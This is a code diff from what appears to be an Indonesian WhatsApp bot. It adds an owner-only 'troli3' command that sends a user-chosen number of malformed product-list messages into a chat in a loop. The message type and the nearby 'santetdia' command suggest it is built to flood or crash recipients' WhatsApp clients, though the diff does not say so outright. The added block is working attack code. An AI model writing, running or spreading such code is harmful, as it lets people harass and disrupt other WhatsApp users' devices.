@@ -397,6 +397,44 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
+case 'troli3': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return anjay(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let doko = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: virgam}}}
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"listMessage": {
+"title": `${buttonkal}`,
+"description": `HW MODS WA${buttonkal}`,
+"buttonText": "",
+"listType": "PRODUCT_LIST",
+"productListInfo": {
+"productSections": [
+{
+"title": `HW MODS WA `,
+	"products": [
+										{
+											"productId": "1847261837216269"
+										}									
+									]
+}
+],
+"headerImage": {
+"productId": "7007318245952499",
+"thumbnail": virgam
+},
+"businessOwnerJid": "6281214281312@s.whatsapp.net",
+},
+"footerText": `HW MODS`,
+}
+}), { userJid: m.chat, quoted: m })
+haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+}
+break
 //=================================================//
 case 'santetdia': {
 if (!isCreator) return
